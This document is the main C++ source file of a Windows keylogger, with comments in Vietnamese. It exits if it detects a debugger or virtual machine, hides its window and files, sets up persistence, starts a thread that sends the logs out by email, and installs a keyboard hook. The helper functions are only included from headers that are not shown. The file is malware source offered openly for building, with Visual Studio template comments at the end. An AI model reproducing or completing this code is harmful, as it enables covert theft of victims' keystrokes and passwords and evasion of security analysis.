#include <iostream>
#include "encryption.h"
#include "antidebug.h"
#include "utils.h"
#include "persistence.h"
#include "keylogger.h"
#include "exfiltration.h"
#include "multilanguage.h"

int main() {
    // Thiết lập UTF-8 cho console (để debug)
    SetConsoleOutputCP(CP_UTF8);

    // Khởi tạo key mã hóa
    encryptionKey = GenerateEncryptionKey();

    // Kiểm tra điều kiện môi trường
    if (IsBeingDebugged() || IsRunningInVM()) {
        return 0;
    }

    // Ẩn cửa sổ
    HideWindow();

    // Thiết lập tên file
    if (SetFileNames()) {
        // Ghi thời gian bắt đầu
        LogTime();

        // Ẩn các file
        HideFiles();

        // Thiết lập persistence
        Persistence();

        // Khởi động thread kiểm tra bảo mật
        std::thread securityThread(SecurityCheckJob);
        securityThread.detach();

        // Khởi động thread exfiltration
        std::thread exfilThread(EmailExfiltrationJob);
        exfilThread.detach();

        // Ghi thông báo bắt đầu
        Write("\n=== Keylogger Started with Multilingual Support ===\n");

        // Ghi thông tin ngôn ngữ hiện tại
        LanguageInfo langInfo = GetCurrentLanguageInfo();
        std::wstring langName = GetLanguageName(langInfo.languageId);
        std::wstring langMsg = L"\n[INITIAL LANGUAGE: " + langName + L"]\n";
        WriteUnicode(langMsg);

        // Khởi động hook bàn phím
        CreateHookThread();
    }

    return 0;
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
